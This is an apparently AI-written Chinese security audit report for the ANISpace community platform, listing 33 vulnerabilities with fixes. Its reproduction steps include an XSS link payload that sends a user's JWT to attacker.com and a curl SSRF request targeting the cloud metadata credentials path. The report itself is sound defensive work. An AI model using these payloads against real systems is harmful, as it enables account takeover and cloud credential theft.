# ANISpace 项目安全与质量审查报告

> **审查日期**：2026-06-09
> **审查范围**：全栈（前端 React 19 SPA + Cloudflare Worker 后端 + D1 SQLite + 配置/CI）
> **审查者**：AI 自动审查
> **修复状态**：本报告**仅做诊断**，所有问题已留待用户审阅决定是否修复
> **报告版本**：v1.0

---

## 0. 摘要

本次审查对 ANISpace 项目（ACG 社区平台）进行了**全栈**漏洞审计，覆盖：
- 前端代码（XSS、鉴权、不安全渲染、localStorage 滥用）
- Cloudflare Worker 后端（SQL 注入、JWT、CORS、SSRF、限流）
- OAuth 流程（CSRF、重定向劫持）
- 数据流（Token 生命周期、错误信息泄露）
- 性能与健壮性（Bundle、内存、并发竞态）
- 依赖与 CI/部署（密钥泄露、依赖版本）

**发现 33 个问题，按严重程度分级：**

| 严重度 | 数量 | 含义 |
|------|------|------|
| 🔴 致命 (Critical) | **3** | 必须立即修复，会被轻松利用造成严重后果 |
| 🟠 严重 (High) | **9** | 应在近期修复，有明确利用路径或重大风险 |
| 🟡 中危 (Medium) | **12** | 应有计划地修复，长期会积累风险 |
| 🔵 低危 (Low) | **9** | 优化/卫生级别，可择期处理 |

**最严重的 3 个问题**：
1. **Worker `verifyJWT` 死循环**（`oauth-proxy.js:81`）：所有鉴权请求会挂起 10s 后超时
2. **MarkdownEditor 持久化 XSS**（`MarkdownEditor.jsx:33-34`）：未限制 `href`/`src` 协议，可注入 `javascript:`
3. **Worker `/api/video/proxy` 开放 SSRF**（`oauth-proxy.js:1208-1226`）：任意 URL 代理，可探测内网/云元数据

---

## 1. 🔴 致命级 (Critical)

### C-1. Worker `verifyJWT` 死循环 → 所有鉴权接口挂起

- **位置**：[`worker/oauth-proxy.js:78-82`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L78-L82)
- **代码**：
  ```js
  const signatureStr = signatureB64.replace(/-/g, '+').replace(/_/g, '/');
  while (signatureStr.length % 4) signatureStr + '=';   // ← 表达式结果未赋回
  const signatureBytes = Uint8Array.from(atob(signatureStr), c => c.charCodeAt(0));
  ```
- **风险**：
  - `signatureStr + '='` 是字符串拼接表达式但**没有赋值回 `signatureStr`**，循环条件永真
  - 实际签名长度 32 字节 → 43 字符（base64 去除 padding）→ `43 % 4 = 3` → **死循环**
  - 后果：每次调用 `getAuthUser()`（几乎所有写操作）都会让 Worker CPU 100% 占用约 10s 后被 Cloudflare 强杀
  - 受影响：发帖、回帖、点赞、关注、收藏、评分、私信、邮件、通知
- **复现**：构造任意已签名 JWT 发给 `/api/posts/1/replies`，观察 Worker 超时
- **修复**：
  ```js
  while (signatureStr.length % 4) signatureStr += '=';
  ```
  建议同时增加单元测试覆盖 JWT 验签流程。

### C-2. MarkdownEditor 持久化 XSS（`javascript:` 协议注入）

- **位置**：[`src/components/Common/MarkdownEditor/MarkdownEditor.jsx:33-34, 61`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/components/Common/MarkdownEditor/MarkdownEditor.jsx#L33-L34)
- **代码**：
  ```js
  html = html.replace(/!\[([^\]]*)\]\(([^)]+)\)/g, '<img class="md-img" src="$2" alt="$1" />');
  html = html.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a class="md-link" href="$2" target="_blank" rel="noopener">$1</a>');
  // ...
  return <div ... dangerouslySetInnerHTML={{ __html: html }} />;
  ```
- **风险**：
  - 解析器只做了**单次** HTML escape（开头），然后所有 URL 字段被原样插入 `src`/`href`
  - 用户在帖子/评论中输入 `[点我](javascript:alert(1))` 即可执行脚本
  - 帖子内容、评论、Wiki、Guestbook、Mailbox 全部走该渲染器，**任意用户对任意其他用户 XSS**
  - 配合 `localStorage` 中存有 JWT（见 H-4），可一键盗号
- **复现**：在论坛发帖或评论中输入 `[xss](javascript:fetch('//attacker.com/?t='+localStorage.getItem('acg_jwt_token')))`
- **修复**：
  ```js
  function safeUrl(url) {
    try {
      const u = new URL(url, 'https://placeholder.invalid/');
      if (!['http:', 'https:', 'mailto:'].includes(u.protocol)) return '';
      return u.toString();
    } catch { return ''; }
  }
  // 用 safeUrl($2) 包裹图片/链接的 url
  ```
  或引入 DOMPurify 做白名单清洗。

### C-3. Worker `/api/video/proxy` 开放 SSRF

- **位置**：[`worker/oauth-proxy.js:1208-1226`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L1208-L1226)
- **代码**：
  ```js
  if (url.pathname === '/api/video/proxy') {
    const baseUrl = url.searchParams.get('baseUrl');
    const path = url.searchParams.get('path');
    // 无任何 host 白名单/协议校验
    const targetUrl = `${baseUrl}${path}${params...}`;
    const res = await fetch(targetUrl, { ... });
  ```
- **风险**：
  - 任意 `baseUrl` + `path` 由调用方控制，可对**任何 host** 发起请求
  - 配合前端 `VideoSourceService.addSource()`（[`src/services/videoSource.js:60-72`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/services/videoSource.js#L60-L72)），任何登录用户都能添加 `http://169.254.169.254/latest/meta-data/`（AWS 元数据）、`http://localhost:port/`（内网端口扫描）、`http://internal.company.local/admin` 等 URL
  - 响应回显给调用方，可完全读取
  - 攻击链：低权限用户 → 添加恶意 baseUrl → 探测云元数据/内网 → 通过 Bangumi 代理的同源/缓存机制可能进一步横向
- **复现**：
  ```bash
  curl 'https://<worker>/api/video/proxy?baseUrl=http://169.254.169.254/&path=latest/meta-data/iam/security-credentials/'
  ```
- **修复**：
  1. **白名单 host**：仅允许 `DEFAULT_SOURCES` 中的 host（`kuapi.co`、`bfzyapi.com`、`guangsuapi.com`、`sdzyapi.com`）
  2. 校验 `path` 必须以 `/api.php/provide/vod/` 开头
  3. 协议必须为 `https://`
  4. 解析 `baseUrl` 后比对 host，禁止 IP 字面量、loopback、metadata 地址

---

## 2. 🟠 严重级 (High)

### H-1. OAuth 流程缺少 `state` 参数 → CSRF 登录劫持

- **位置**：
  - 构建授权 URL：[`src/services/api.js:1088-1096 (BangumiAuthService.buildAuthUrl)`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/services/api.js)
  - 同上 `GitHubAuthService.buildAuthUrl`（约 1120 行）
  - 回调处理：[`src/pages/OAuthCallback.jsx:18-58`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/pages/OAuthCallback.jsx)
- **风险**：攻击者构造 `https://your-app/auth/github?code=<attacker_code>`，诱骗已登录用户点击，可使**受害者的会话绑定到攻击者的 OAuth 账户**
- **修复**：生成随机 `state` 存 `sessionStorage`，回调时验证后清除；服务端在 `/oauth/*/token` 也校验

### H-2. `ALLOWED_ORIGIN` 前缀匹配可被绕过

- **位置**：[`worker/oauth-proxy.js:1140`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L1140)
- **代码**：
  ```js
  if (allowedOrigin && origin && !origin.startsWith(allowedOrigin)) {
    return jsonResponse({ error: '来源不被允许' }, 403, origin);
  }
  ```
- **风险**：
  - 当前 `ALLOWED_ORIGIN = "https://afterrain-2005.github.io"`
  - 攻击者注册 `https://afterrain-2005.github.io.attacker.com` → 绕过 CORS 白名单
- **修复**：改用**精确匹配**或解析 URL 后比对 origin：
  ```js
  try {
    const o = new URL(origin);
    const a = new URL(allowedOrigin);
    if (o.origin !== a.origin) return forbidden();
  } catch { return forbidden(); }
  ```

### H-3. OAuth `redirect_uri` 由用户传入 → 重定向劫持

- **位置**：[`worker/oauth-proxy.js:1162, 1178`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L1162)
- **代码**：
  ```js
  const redirectUri = url.searchParams.get('redirect_uri') || `${allowedOrigin}/auth/bangumi`;
  ```
- **风险**：调用方可注入任意 `redirect_uri`，Worker 会带着 `code` 跳转到该 URL（典型 OAuth 开放重定向）。配合 CSRF（无 state），可完成账户接管。
- **修复**：
  - 严格白名单 `redirect_uri`，仅允许 `https://afterrain-2005.github.io/auth/{bangumi,github}` 与开发环境
  - 或忽略 query 中的 `redirect_uri`，强制使用 `env.ALLOWED_ORIGIN + '/auth/...'`

### H-4. JWT 存于 `localStorage` + 默认密钥硬编码

- **位置**：
  - 默认密钥：[`worker/oauth-proxy.js:102, 368`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L102)
  - 前端存储：[`src/services/api.js:192`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/services/api.js#L192)
  - 写入：`localStorage.setItem('acg_jwt_token', data.token)`
- **风险**：
  - 默认密钥 `'anispace-jwt-secret-change-me'` 是公开仓库可见，**任何拿到源码的人都能伪造任意用户的 JWT**
  - JWT 有效期 7 天且无 refresh/revoke 机制
  - localStorage 中的 JWT 在 C-2 XSS 触发后可被读取
- **修复**：
  1. 删除默认密钥，启动时若 `env.JWT_SECRET` 缺失则 `throw`
  2. JWT 改用 `httpOnly` Cookie（需配合 SameSite=Lax）
  3. 增加 JWT 黑名单/版本号机制支持登出失效

### H-5. CI 把 OAuth Client Secret 注入前端 build

- **位置**：[`.github/workflows/deploy.yml:30-34`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/.github/workflows/deploy.yml#L30-L34)
- **风险**：
  - `secrets.VITE_BANGUMI_CLIENT_SECRET` / `secrets.VITE_GITHUB_CLIENT_SECRET` 通过 env 注入到 `npm run build`
  - Vite 会把 `import.meta.env.VITE_*` 静态替换到 bundle，**任何前端代码引用了 VITE_*_SECRET 都会被打包进 dist/，公开可下载**
  - 当前 `oauth.config.js` 仅引用 `_CLIENT_ID`，没引用 secret → **暂时安全**
  - 但这是 footgun：未来若有人在 `oauth.config.js` 加 `getEnvVar('VITE_BANGUMI_CLIENT_SECRET')`，Secret 立刻泄露到 GitHub Pages
- **修复**：
  - 从 workflow 中删除 `*_CLIENT_SECRET` 注入（Vite 前端**永远**不应持有 client secret）
  - 添加 `.env.example` 注释 + ESLint 规则禁止 `import.meta.env.VITE_.*SECRET`

### H-6. 错误信息直接返回内部异常 → 信息泄露

- **位置**：Worker 内多处 `jsonResponse({ error: 'xxx失败: ' + err.message }, 500, origin)`
- **示例**：
  - [`oauth-proxy.js:393`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L393) `登录失败: ${err.message}`
  - [`oauth-proxy.js:466`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L466) `创建帖子失败: ${err.message}`
- **风险**：D1 错误消息可能包含表名、列名、SQL 片段，攻击者可借此推断 schema 与约束
- **修复**：生产环境仅返回 `{ error: '服务异常' }`，详细日志写入 `console.error` 由 Cloudflare 日志收集

### H-7. 缺少速率限制 (Rate Limit) → 滥用与 DoS

- **风险**：
  - `/api/auth/login`（POST）：恶意创建无数用户撑爆 D1
  - `/api/posts/:id/like`：瞬时刷量
  - `/api/private-messages`：垃圾私信轰炸
  - `/api/world-messages`：刷屏
  - `/api/mails`：邮件炸弹
- **修复**：使用 Cloudflare Workers Rate Limiting binding，或维护 KV 做滑动窗口：
  ```js
  const ip = request.headers.get('CF-Connecting-IP');
  const key = `rl:${ip}:${pathname}`;
  const count = await env.RL.get(key);
  if (Number(count) > 100) return new Response('Too Many Requests', { status: 429 });
  ```

### H-8. `profile` 头像 / 背景图无大小与内容校验

- **位置**：[`src/components/Profile/Profile.jsx:144-155`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/components/Profile/Profile.jsx#L144-L155)
- **风险**：
  - 前端校验 `file.size > 5MB` → 仅前端，后端 PUT `/api/users/:id` 接收 `avatar` 字段为 base64 时**无任何校验**
  - 攻击者 PUT 1GB 的 base64 字符串撑爆 D1 行（D1 单行上限约 1MB）
- **修复**：服务端 base64 解码后校验大小 + magic bytes，必要时转存 R2

### H-9. WorldChannel 消息完全存 `localStorage` → 与后端割裂

- **位置**：[`src/components/WorldChannel/WorldChannel.jsx:24-27, 39-51`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/components/WorldChannel/WorldChannel.jsx#L24-L27)
- **风险**：
  - "世界频道" 实际上**只对本地浏览器可见**，不是真正的社交频道
  - `id: Date.now()` 多个标签页/设备会产生 ID 冲突
  - `StorageService.get('acg_users', []).length` 显示"在线人数"是错的（这是注册用户数）
  - 没有限流，用户可瞬时发 1 万条消息撑爆 localStorage
- **修复**：迁移到 `WorldChannelService.sendMessage`（已有后端实现），按用户限频

---

## 3. 🟡 中危级 (Medium)

### M-1. 缺少 Content-Security-Policy 等安全响应头

- **位置**：[`index.html:1-22`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/index.html)、Cloudflare Worker 响应
- **缺失**：
  - `Content-Security-Policy`（关键）
  - `X-Frame-Options: DENY`
  - `X-Content-Type-Options: nosniff`
  - `Referrer-Policy: strict-origin-when-cross-origin`
  - `Permissions-Policy`
- **修复**：
  ```html
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    img-src 'self' data: https:;
    script-src 'self' 'unsafe-inline';
    style-src 'self' 'unsafe-inline';
    connect-src 'self' https://api.bgm.tv https://*.workers.dev;
    frame-ancestors 'none';
  ">
  ```
  Worker 出口添加以上头。

### M-2. `Forum.jsx PostPreview` 与 `Mailbox` 渲染走 `dangerouslySetInnerHTML`

- **位置**：
  - [`src/components/Forum/Forum.jsx:127`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/components/Forum/Forum.jsx#L127) 帖子预览
  - [`src/components/Mailbox/Mailbox.jsx:344, 417`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/components/Mailbox/Mailbox.jsx#L344) 邮件渲染
  - 邮件内 `renderMailContent` 做了 `sanitizeHtml`（仅 escape）—— 安全；Forum PostPreview **没有 sanitize** —— 风险
- **风险**：论坛帖子预览的 `[^)]+` 同样未做协议白名单，与 C-2 同源风险
- **修复**：Forum 的 `renderContent` 应复用 `parseMarkdown` + `safeUrl`，或直接渲染纯文本

### M-3. `verifyJWT` 路径上的边界 bug

- 即使修了死循环，base64Url 解码后 `payload` 没限制大小，极端长 token 会引发 DoS
- `parts.length !== 3` 仅判断段数，没校验 base64 字符集
- **修复**：
  - 增加 token 长度上限（如 4KB）
  - 用 `^[A-Za-z0-9_-]+$` 校验字符集
  - 捕获 `atob` 抛错

### M-4. 关注/取消关注非原子 → 计数不一致

- **位置**：[`worker/oauth-proxy.js:545-571`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L545-L571)
- **风险**：
  - 仅插入/删除 `follows` 表，未同步更新 `users.following_count` / `follower_count`
  - schema 里有这两个字段但代码从未维护
  - 高并发下 `likes` 表 UNIQUE 约束会被破坏（多条同 user-post 点赞）
- **修复**：
  - 用 D1 `batch` 合并多个 statement
  - 关键操作包裹 `db.batch([...])` 原子提交

### M-5. `users.preferences` 字段以 JSON 文本存储

- **位置**：[`oauth-proxy.js:430-447`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/oauth-proxy.js#L430-L447)
- **风险**：
  - 写入用 `preferences ? JSON.stringify(preferences) : null`
  - 读取未 parse，前端拿到字符串而非对象 → 业务 bug
- **修复**：读取时 `JSON.parse` 并容错

### M-6. `BangumiService` 缓存键可能过载 `localStorage`

- **位置**：[`src/services/api.js:61-81`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/services/api.js#L61-L81)
- **风险**：
  - 所有 Bangumi API 响应都进 localStorage；热门作品详情 ~30KB × 数百个 = 撑爆
  - LRU/最大容量未实现
  - `CacheManager.set` 中虽然有 `catch`，但吞掉错误用户无感
- **修复**：用 IndexedDB（`idb` 库）或加最大条目数 + LRU 淘汰

### M-7. 视频播放页（推测）可能直接渲染用户输入的 m3u8 URL

- 未在本次审查范围内完整读 VideoDetail.jsx，但 `VideoSourceService.getDetail` 返回的 `episode.url` 来自第三方 API，第三方可能返回任意 URL（含 javascript:）
- **修复**：渲染前用 `safeUrl`（同 C-2 修复方案）过滤

### M-8. `Amadeus` 模块的 LLM API Key 存 `localStorage` 明文

- **位置**：[`src/components/Amadeus/Amadeus.jsx:142, 158, 169`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/components/Amadeus/Amadeus.jsx#L142)
- **风险**：
  - 用户配置的 OpenAI/Custom API Key 存 `localStorage` 明文
  - 任意同源 JS（含 XSS、第三方 npm 包注入）可读取
- **修复**：建议改为后端代理（密钥仅存 Worker secret），或加二次密码加密

### M-9. 依赖版本存疑

- **位置**：[`package.json:13-32`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/package.json)
- **问题**：
  - `lucide-react: ^1.14.0` —— 1.x 是非常旧的版本线，官方主流是 0.4xx 系列；此版本号可能不存在或不稳定（请核对 npm registry）
  - `vite: ^8.0.10` —— 截至审查时 Vite 主版本是 6.x，需确认 8.x 是 RC 还是 typo
  - `eslint: ^10.2.1` —— 同样需核对
- **建议**：运行 `npm audit` + `npm outdated` 核对；锁定精确版本

### M-10. `wrangler.toml` 提交了 `account_id`

- **位置**：[`worker/wrangler.toml:5`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/wrangler.toml)
- **风险**：
  - `account_id` 不算 secret，但配合其他 worker 配置可能被滥用
  - 建议：常规项目不需要将 `account_id` 写进 repo，可改用 `wrangler deploy` 时自动从 `.dev.vars` 读取
- **风险等级**：低，但属于卫生

### M-11. 缺少关键索引

- **位置**：[`worker/schema.sql`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/worker/schema.sql)
- **缺失**：
  - `posts` 表缺 `(category, created_at DESC)` 复合索引（论坛按分类排序）
  - `world_messages` 已有 `created_at DESC` ✅
  - `private_messages` 缺 `(to_user_id, from_user_id, read)` 索引
  - `mails` 缺 `(to_user_id, created_at DESC)` 索引
- **修复**：补建索引

### M-12. `videoSource.js` 第三方 API 失败静默

- **位置**：[`src/services/videoSource.js:99-102`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/services/videoSource.js#L99-L102)
- **风险**：单个源失败被 `Promise.allSettled` 吞掉，用户看到 "0 结果" 不知道是网络问题还是关键词问题
- **修复**：前端提示"X 个源请求失败"（已有 `group.error` 但未展示给用户）

---

## 4. 🔵 低危级 (Low)

### L-1. 仓库内临时 SQLite 文件

- **文件**：`test-bangumi.db-shm`、`test-bangumi.db-wal`（项目根目录）
- **风险**：调试残留，意外被提交
- **修复**：加入 `.gitignore`（`*.db*`），并 `git rm --cached` 已追踪的

### L-2. `.gitignore` 不完整

- **位置**：[`.gitignore`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/.gitignore)
- **缺失**：
  - `*.db`, `*.db-shm`, `*.db-wal`
  - `.dev.vars`（wrangler 本地密钥）
  - `.vercel/`、`.turbo/` 等
  - `coverage/`

### L-3. `Mailbox.jsx` `sanitizeHtml` 与 Forum `renderContent` 命名相似但实现不同

- 容易后续维护混淆（一个安全、一个不安全）
- **修复**：统一抽离到 `src/utils/sanitize.js`

### L-4. `404.html` 多次刷新会反复写 `sessionStorage`

- **位置**：[`public/404.html:8`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/public/404.html)
- 影响：极低，可接受

### L-5. `eslint.config.js` 未集成 a11y 规则

- 没有 `eslint-plugin-jsx-a11y`，缺 alt/aria 等可访问性检查
- **修复**：添加 `eslint-plugin-jsx-a11y`

### L-6. 大量 `<img>` 缺 `loading="lazy"`

- 个别组件已用 `loading="lazy"`，但 Forum、Profile 部分图片未用
- **修复**：搜索 `<img` 逐个补充

### L-7. `info`/`error` 状态在 set 后未清理

- 部分组件的 `setError(...)` 在成功后没有 clear，下次组件挂载会显示旧错误
- **修复**：在 `finally` 中清空

### L-8. `BangumiService._request` retry 时 `useCache = false` 但仍先查缓存

- **位置**：[`src/services/api.js:355-360`](file:///d:/Desktop/Ideas/ANISpace/ANISpace/src/services/api.js#L355-L360)
- 原因：retry 时 `useCache = false` 但代码未 `return` 直接走 fetch，OK。但 `_request` 重入时 `useCache` 仍是 false，没问题
- 风险：低，仅逻辑可读性问题

### L-9. 注释 / 日志泄露内部细节

- 多处 `console.error` 输出 token、stack trace
- 生产构建可被 source map 还原
- **修复**：构建时移除 sourcemap（`build.sourcemap: false`）

---

## 5. 修复优先级建议

### 第 1 周（必须）
1. C-1 verifyJWT 死循环（1 行代码 + 单测）
2. C-3 SSRF 白名单
3. C-2 MarkdownEditor XSS

### 第 2 周
4. H-1 OAuth state 参数
5. H-2 ALLOWED_ORIGIN 精确匹配
6. H-3 redirect_uri 白名单
7. H-4 JWT 密钥 + Cookie 改造
8. H-5 移除 CI 中 secret 注入

### 第 3 周
9. H-6 错误信息脱敏
10. H-7 Rate Limit
11. H-8 头像/背景图服务端校验
12. H-9 WorldChannel 数据迁移到后端
13. M-1 CSP 等安全响应头
14. M-2 其它 dangerouslySetInnerHTML 收口

### 后续
15. M-3 ~ M-12 中危项
16. L-1 ~ L-9 卫生类

---

## 6. 审查方法论

本次审查使用了以下方法（与 TRAE-code-review / TRAE-security-review 技能对应的检查项一致）：

1. **静态代码分析**：对所有 JS/JSX/SQL 文件进行 grep + 全文阅读
2. **数据流追踪**：从前端组件 → Service → API → Worker → D1，逐层审查
3. **配置审查**：package.json、vite.config、wrangler.toml、CI workflow、.gitignore
4. **威胁建模**：基于 STRIDE 框架对每个外部输入（用户输入、URL 参数、OAuth 回调、第三方 API 返回值）做威胁评估
5. **依赖审计**：核对依赖版本号、检查 dev/prod 注入的 secrets

未覆盖项：
- 运行时动态分析（未实际跑 `npm run dev` / `wrangler dev`）
- 渗透测试（未做主动攻击）
- 性能压测（未做负载测试）
- D1 真实数据量下的查询性能

---

## 7. 附录：审查未触达的盲点

以下区域**未做完整审查**，建议补查：
- `src/components/Video/VideoDetail.jsx` —— 视频播放器集成 m3u8/弹幕，潜在 XSS/资源耗尽
- `src/components/Music/MusicPlayer.jsx` —— 音频控制
- `src/components/Live2DViewer.jsx` / `Live2DWidget.jsx` —— 资源加载
- `src/components/Notification/Notifications.jsx` —— 通知渲染
- `src/components/TouchGal/TouchGalApp.jsx` —— 画廊组件
- `src/components/Wiki/Wiki.jsx` —— 百科（可能复用 MarkdownEditor）
- `src/components/FriendSpace/FriendSpace.jsx`
- `src/components/NewsZone/NewsDetail.jsx`
- `src/components/Guestbook/Guestbook.jsx` 全文

如需深入审查这些模块，请告知。

---

*报告结束*
